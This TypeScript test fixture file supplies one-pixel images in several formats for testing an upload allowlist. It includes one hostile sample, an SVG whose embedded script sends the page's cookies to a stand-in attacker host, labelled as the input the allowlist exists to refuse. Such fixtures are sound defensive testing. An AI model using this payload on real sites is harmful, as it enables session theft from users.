/**
 * Real, minimal images — one pixel each, in every format on the allowlist.
 *
 * They are genuine files rather than hand-made headers, so the format sniffing
 * under test is looking at what a browser would actually send.
 */

function decode(base64: string): Uint8Array {
  return new Uint8Array(Buffer.from(base64, "base64"));
}

/** 1x1 transparent PNG. */
export const PNG_1x1 = decode(
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==",
);

/** 1x1 GIF87a. */
export const GIF_1x1 = decode(
  "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7",
);

/** 1x1 baseline JPEG. */
export const JPEG_1x1 = decode(
  "/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAALCAABAAEBAREA/8QAFAABAAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAD8AKp//2Q==",
);

/** 1x1 lossy WebP (RIFF container). */
export const WEBP_1x1 = decode(
  "UklGRhoAAABXRUJQVlA4TA0AAAAvAAAAEAcQERGIiP4HAA==",
);

/** An SVG carrying a script. The thing the allowlist exists to refuse. */
export const MALICIOUS_SVG = new TextEncoder().encode(
  `<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">` +
    `<script>document.location='https://evil.example/'+document.cookie</script>` +
    `</svg>`,
);

/**
 * A valid PNG grown past a size limit. Trailing bytes after IEND are ignored by
 * a decoder and do not change the signature, so this is still genuinely a PNG —
 * it is simply too big.
 */
export function oversizedPng(totalBytes: number): Uint8Array {
  const padded = new Uint8Array(totalBytes);
  padded.set(PNG_1x1.subarray(0, Math.min(PNG_1x1.length, totalBytes)));
  return padded;
}
